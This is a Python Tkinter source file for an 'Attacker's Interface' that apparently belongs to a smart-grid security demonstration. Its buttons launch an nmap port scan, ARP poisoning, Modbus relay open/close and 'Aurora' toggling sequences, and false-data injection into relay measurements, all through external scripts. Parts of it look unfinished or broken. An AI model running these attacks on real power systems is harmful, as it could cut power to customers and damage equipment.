from tkinter import*
from PIL import ImageTk, Image
from tkinter import messagebox
from tkinter.ttk import Progressbar, Style
from scapy.all import *
#from change_settings import change_settings
import os


class CreateToolTip(object):
    """
    create a tooltip for a given widget
    """
    def __init__(self, widget, text='widget info'):
        self.waittime = 500     #miliseconds
        self.wraplength = 180   #pixels
        self.widget = widget
        self.text = text
        self.widget.bind("<Enter>", self.enter)
        self.widget.bind("<Leave>", self.leave)
        self.widget.bind("<ButtonPress>", self.leave)
        self.id = None
        self.tw = None

    def enter(self, event=None):
        self.schedule()

    def leave(self, event=None):
        self.unschedule()
        self.hidetip()

    def schedule(self):
        self.unschedule()
        self.id = self.widget.after(self.waittime, self.showtip)

    def unschedule(self):
        id = self.id
        self.id = None
        if id:
            self.widget.after_cancel(id)

    def showtip(self, event=None):
        x = y = 0
        x, y, cx, cy = self.widget.bbox("insert")
        x += self.widget.winfo_rootx() + 250
        y += self.widget.winfo_rooty() + 10
        # creates a toplevel window
        self.hidetip()
        self.tw = Toplevel(self.widget)
        # Leaves only the label and removes the app window
        self.tw.wm_overrideredirect(True)
        self.tw.wm_geometry("+%d+%d" % (x, y))
        label = Label(self.tw, text=self.text, justify='left',
                       background="#ffffff", relief='solid', borderwidth=1,
                       wraplength = self.wraplength)
        label.pack(ipadx=1)

    def hidetip(self):
        tw = self.tw
        self.tw= None
        if tw:
            tw.destroy()

##################################################
#--- Attacker's window ---#
attacker = Tk()
attacker.title('Attacker')

image_att=Image.open('_images/skull.png')
imageW, imageH = 600, 600
image_att=image_att.resize((imageW, imageH))
img_att = ImageTk.PhotoImage(image_att)

panel_att=Label(attacker, text="fdfd",image = img_att)
panel_att.place(x=0, y=0, relwidth=1, relheight=1)

attacker.configure(bg='black')
#attacker.geometry('260x260')
attacker.geometry(str(imageW) + 'x'+ str(imageH))
Label(attacker,text="Attacker's Interface",font="Courier 24 bold",bg='black',fg='DeepSkyBlue2').pack(pady=4)

# User input target device IP
def submitIP():
  ipAddr = e1.get();
  print('[>] Targeted IP address', ipAddr)
  return ipAddr

Label(attacker, text="", bg='black').pack(pady=5) # spacer between IP entry and buttons

ipAddr = StringVar()  
Label(attacker,text="Target IP:",
      font="Courier 16",bg='black',fg='DeepSkyBlue2').place(x=50, y=50)
e1 = Entry(attacker, width=20, textvariable=ipAddr)
e1.insert(50,"192.168.1.2")
#e1.pack(padx=5, pady=10)
e1.place(x=200, y=50)
bEnter = Button(attacker, text='Enter', font="Courier 10", 
                bg='green', fg='white',
                command=submitIP) 
bEnter.place(x=400,y=50)

# Attack buttons
b1=Button(attacker,text="Port Scanning",font="Courier 16")
b1.pack(pady=10)
b1_ttp=CreateToolTip(b1,"A port scanner is an application designed to probe a server or host for open ports. Such an application may be used by administrators to verify security policies of their networks and by attackers to identify network services running on a host and exploit vulnerabilities.")

b2=Button(attacker,text="ARP Poisoning",font="Courier 16")
b2.pack(pady=5)
b2_ttp=CreateToolTip(b2,'ARP poisoning sends malicious ARP packets to initiate a person-in-the-middle attack')

b3=Button(attacker,text="Close Breaker Attack",font="Courier 16")
b3.pack(pady=5)
b3_ttp=CreateToolTip(b3,"The attacker gains access to the network exploiting an unsecured work station. A modbus packet is sent ONCE with a close  command to the relay that controls the switch between the two feeders forcing the utility to buy unnecessary power from an external source.")

b4=Button(attacker,text="Aurora Attack",font="Courier 16")
b4.pack(pady=5)
b4_ttp=CreateToolTip(b4,"The attacker gains acess to the network exploiting an unsecured work station. Modbus packets are sent to Relay 1 continuosly containing open/close commands. This attack will cause costumers to have intermitent power that can damage devices.")

b5=Button(attacker,text="Relay FDI Attack",font="Courier 16")
b5.pack(pady=5)
b5_ttp=CreateToolTip(b5,"The attacker gains acess to the network exploiting an unsecured work station and install a Malware in a protection relay that falsifies power measurements")


# Progress bar widget
s = Style()
s.theme_use('clam')
s.configure("red.Horizontal.TProgressbar", foreground='red', background='red')
progBar = Progressbar(attacker, style="red.Horizontal.TProgressbar", orient=HORIZONTAL, length=200, mode='determinate')
progBar.place(x=200,y=550)

# Progress update text
progLbl1=Label(attacker,bg='black',font="Courier 12",fg='Red',justify='center')
progLbl1.pack(pady=5)

progLbl2=Label(attacker,font='Courier 12',bg='black', fg='Red')#fg='DeepSkyBlue2')
progLbl2.pack()

# Quit application
bQuit = Button(attacker,
          text='Quit', font="Courier 10", bg='red', fg='white')
    #      command=attacker.quit) 
bQuit.place(x=540,y=550)
##################################################
'''
##################################################
#--- Defender's window ---#
defender = Toplevel()
defender.title('Defender')
defender.configure(bg='white')
defender.geometry('300x180')

# header
Label(defender,text = "Defender's Interface",font="Helvetica 16 bold",bg='white').pack(pady=4)
L_detect = Label(defender,font="Courier 16", 	   bg='white',justify='left',wraplength=100)
L_detect.pack(pady=4)

# black field with green status text
canvas = Canvas(defender,height=100,width=275,bg='black')
canvas.place(x=10, y=30)
canvas.create_rectangle(3,3,300,100,width=10)
c_text= canvas.create_text(125,50,font=('Courier 9'),text='',fill='green2',width=280)

# U-smart logo
image = Image.open('images/Smart_Energy2.jpg')
logoW = 100; logoH = int(logoW*(150/500)); 
image = image.resize((logoW,logoH))
img = ImageTk.PhotoImage(image)

panel=Label(defender, text="fdfd",image = img)
panel.place(x=10,y=135)
##################################################
'''

############--- BUTTON 1 ---##############
# Function responsible for initiating PORT SCAN
def Port_scanning():
    import time
    #canvas.itemconfig(c_text, text="")
    progLbl2.config(text=' ')
    #L_detect.configure(text=' ')
    progLbl1.config(bg="black")
    progLbl1.config(text="")
    progLbl1.config(text="              Identifying available ports             ")
    progBar['value'] = 0
    attacker.update_idletasks()
    progBar['value'] = 33
    attacker.update_idletasks()
    strNMAP = "nmap -o reportScan.txt -Pn -p1-10000 " + ipAddr.get()
    os.system('echo [*] Begin port scan of target {}\n'.format(str(ipAddr.get())))
    os.system(strNMAP)  ## Launching attack

    #canvas.itemconfig(c_text, text="An unknown user is performing \na port scanning attack on device " + ipAddr.get())

    progBar['value'] = 66
    attacker.update_idletasks()

    progBar['value'] = 100
    if True:
      mylines=[]
    # with open("report.txt","r") as f:
      with open("reportScan.txt","r") as f:
        for myline in f:
          mylines.append(myline)
      print(mylines[4:])
      progLbl2.config(text=' '.join(mylines[4:-1]))
    else:    
      progLbl1.config(text='The available ports are:')
      progLbl2.config(text='21 (FTP), 23 (Telnet), 502 (Modbus)')
    #attacker.update_idletasks()
    #time.sleep(2)

############--- BUTTON 2 ---##############
# Function responsible for the updation
# of the progress bar value for the ARP attack
def ARP_poison():
    import time
    #canvas.itemconfig(c_text, text='')
    progLbl2.config(text='                                              ')

    #L_detect.configure(text='')
    progLbl1.config(text=" ")
    progLbl1.config(bg="black")
    progLbl1.config(text="     Launching ARP attack     ")
    progBar['value'] = 0
    attacker.update_idletasks()
    time.sleep(0.5)

    progBar['value'] = 20
    attacker.update_idletasks()
    time.sleep(1)

    progBar['value'] = 60
    progLbl1.config(text=" ")
    progLbl1.config(bg="black")
    progLbl1.config(text="          Accessing Network          ")

    #os.system("python arp_poisoner.py -i eno1 -t1 192.168.1.2 -t2 192.168.1.10") # Launching attack
    #os.system("python3 arp_poisoner3.py -i enp40s0 -t1 192.168.1.2 -t2 192.168.1.10") # Launching attack
    os.system("sudo python3 arpy2a.py -t1 " + str(ipAddr.get())) # Launching attack
    attacker.update_idletasks()

    # try to read ARP attack packet capture
    try:
        scapy_cap = rdpcap('reportSpoof.pcap')
        if len(scapy_cap) == 0:
            progLbl1.config(text="Attack failed to capture packets")
        else: 
            progLbl1.config(text="{} packets stolen by ARP poisoner".format(len(scapy_cap)) )
            print(scapy_cap)
    except FileNotFoundError: progLbl1.config(text="Attack failed to capture packets")
             
    #L_detect.config(text="The SDN switch has denied access ")
    #canvas.itemconfig(c_text,text='The SDN switch has denied access to suspicious ARP messages')
    #time.sleep(2)

    progBar['value'] = 100
    #progLbl1.config(text="    Access denied.  ARP attack Failed   ")

############--- BUTTON 3 ---##############
def Close_relay():
    import time
    #canvas.itemconfig(c_text, text='')
    progLbl2.config(text='                                             ')
    #L_detect.configure(text='')
    progLbl1.config(text="")
    progLbl1.config(text="         Exploiting open modbus port.           ")
    progBar['value'] = 0
    attacker.update_idletasks()
    progBar['value'] = 33
    attacker.update_idletasks()
    progBar['value'] = 66
    progLbl1.config(text="        Sending close command to {}     ".format(str(ipAddr.get())))
    attacker.update_idletasks()

# attack commands
    os.system('echo [*] Connecting to target {}'.format(str(ipAddr.get())))
    time.sleep(2)
    os.system('python3 flip_rbit.py -t {} -b 27 -o off -p False'.format(str(ipAddr.get())))
    os.system('python3 flip_rbit.py -t {} -b 28 -o off -p False'.format(str(ipAddr.get())))
    os.system('python3 flip_rbit.py -t {} -b 28 -o on -p True'.format(str(ipAddr.get())))
    os.system('python3 flip_rbit.py -t {} -b 28 -o off -p False'.format(str(ipAddr.get())))

    progBar['value'] = 100
    #progLbl1.config(text="               Successful attack.              ")
    attacker.update_idletasks()
    #time.sleep(1)

    #canvas.itemconfig(c_text, text="Relay {} has closed ".format(str(ipAddr.get())))
    attacker.update_idletasks()
    time.sleep(2)

    #canvas.itemconfig(c_text,text='Relay {} has closed\nNo overcurrent has been observed'.format(str(ipAddr.get())))
    attacker.update_idletasks()
    #time.sleep(2)
    #canvas.itemconfig(c_text,text='Relay {} has closed\nNo overcurrent has been observed\nPossible fake command detected'.format(str(ipAddr.get())))
    #messagebox.askquestion("Warning!!","Relay 3 may be compromised\nExecute security protocol?")
    attacker.update_idletasks()
    #time.sleep(2)
    canvas.itemconfig(c_text,text='Relay {} has closed\nNo overcurrent has been observed\nPossible fake command detected\nExcecuting security protocol\n*'.format(str(ipAddr.get())))
    attacker.update_idletasks()
    #time.sleep(1)
    #canvas.itemconfig(c_text,text='Relay {} has closed\nNo overcurrent has been observed\nPossible fake command detected\nExcecuting security protocol\n* *'.format(str(ipAddr.get())))
    attacker.update_idletasks()
    #time.sleep(1)
    #canvas.itemconfig(c_text, text='Relay {} has closed\nNo overcurrent has been observed\nPossible fake command detected\nExcecuting security protocol\n* * *'.format(str(ipAddr.get())))
    attacker.update_idletasks()
    #time.sleep(1)
    #canvas.itemconfig(c_text,text='Relay {} has closed\nNo overcurrent has been observed\nPossible fake command detected\nExcecuting security protocol\n\nThe attack has been cleared'.format(str(ipAddr.get())))

############--- BUTTON 4 ---##############
def Aurora_attack():

    import time
    #canvas.itemconfig(c_text, text='')
    progLbl2.config(text='                                             ')

    #L_detect.configure(text='')
    progLbl1.config(text="")

    progLbl1.config(text="   Exploiting open modbus port    ")
    progBar['value'] = 0
    attacker.update_idletasks()
    progBar['value'] = 33
    attacker.update_idletasks()
    progBar['value'] = 66
    progLbl1.config(text="   Sending ON/OFF sequence to {}".format(str(ipAddr.get())))
    attacker.update_idletasks()
    time.sleep(1)

    progBar['value'] = 100
    #progLbl1.config(text="          Successful attack         ")

# trip 1
    os.system("python3 flip_rbit.py -t {} -b 27 -o on -p True".format(str(ipAddr.get())))
    attacker.update_idletasks()
    time.sleep(2)

    os.system("python3 flip_rbit.py -t {} -b 27 -o off -p False".format(str(ipAddr.get())))

    #canvas.itemconfig(c_text, text="Relay {} has tripped".format(str(ipAddr.get())))
    attacker.update_idletasks()
    time.sleep(2)
# close 1
    os.system("python3 flip_rbit.py -t {} -b 28 -o on -p True".format(str(ipAddr.get())))

    #canvas.itemconfig(c_text, text='Relay {} has tripped\nNo overcurrent has been observed'.format(str(ipAddr.get())))
    attacker.update_idletasks()
    time.sleep(2)
    os.system("python3 flip_rbit.py -t {} -b 28 -o off -p True".format(str(ipAddr.get())))

    #canvas.itemconfig(c_text, text='Relay {} has tripped\nNo overcurrent has been observed\nRelay 1 has closed\nPossible unauthorized access'.format(str(ipAddr.get())))
    attacker.update_idletasks()
    #canvas.itemconfig(c_text, text='Relay {} has tripped\nNo overcurrent has been observed\nRelay 1 has closed\nPossible unauthorized access\nBlocking all external communications\n*'.format(str(ipAddr.get())))
    time.sleep(2)
        
# trip 2
    os.system("python3 flip_rbit.py -t {} -b 27 -o on -p True".format(str(ipAddr.get())))
    attacker.update_idletasks()
    time.sleep(2)
    #canvas.itemconfig(c_text, text='Relay {} has tripped\nNo overcurrent has been observed\nRelay 1 has closed\nPossible unauthorized access\nBlocking all external communications\n* *'.format(str(ipAddr.get())))
    attacker.update_idletasks()
    #canvas.itemconfig(c_text, text='Relay {} has closed\nNo overcurrent has been observed\nRelay {} has closed\nPossible unauthorized access\nBlocking all external communications\n* * *'.format(str(ipAddr.get()),str(ipAddr.get())))
    
    os.system("python3 flip_rbit.py -t {} -b 27 -o off -p False".format(str(ipAddr.get())))
    attacker.update_idletasks()
    time.sleep(2)
    #canvas.itemconfig(c_text, text='Relay {} has closed\nRelay {} has opened\nPossible unauthorized access\nBlocking all external communications\n\nThe attack has been contained.'.format(str(ipAddr.get()),str(ipAddr.get())))

# close 2
    os.system("python3 flip_rbit.py -t {} -b 28 -o on -p True".format(str(ipAddr.get())))
    os.system("python3 flip_rbit.py -t {} -b 28 -o off -p False".format(str(ipAddr.get())))
    os.system("python3 flip_rbit.py -t {} -b 27 -o off -p False".format(str(ipAddr.get())))  
    
## Button 5: Ramp Attack to power measurements of Relay 
def ramp_attack():
    import time
    #canvas.itemconfig(c_text, text='')
    progLbl2.config(text='                                             ')

    #L_detect.configure(text='')
    progLbl1.config(text="")

    progLbl1.config(text="   Injecting false data to relay measurements    ")
    progBar['value'] = 0
    attacker.update_idletasks()
    progBar['value'] = 33
    attacker.update_idletasks()
    progBar['value'] = 66
    attacker.update_idletasks()
    time.sleep(1)

    progBar['value'] = 100
    #progLbl1.config(text="          Successful attack         ")   
    os.system("python3 ramp_attack.py -tf 10000") 
     
def button_quit():
    os.system("python3 ramp_attack.py -tf 1") 
    attacker.quit    

############--- BUTTON Actions ---##############
b1.config(command=Port_scanning)
b2.config(command=ARP_poison)
b3.config(command=Close_relay)
b4.config(command=Aurora_attack)
b5.config(command=ramp_attack)
bQuit.config(command=button_quit)

attacker.mainloop()
#defender.mainloop()
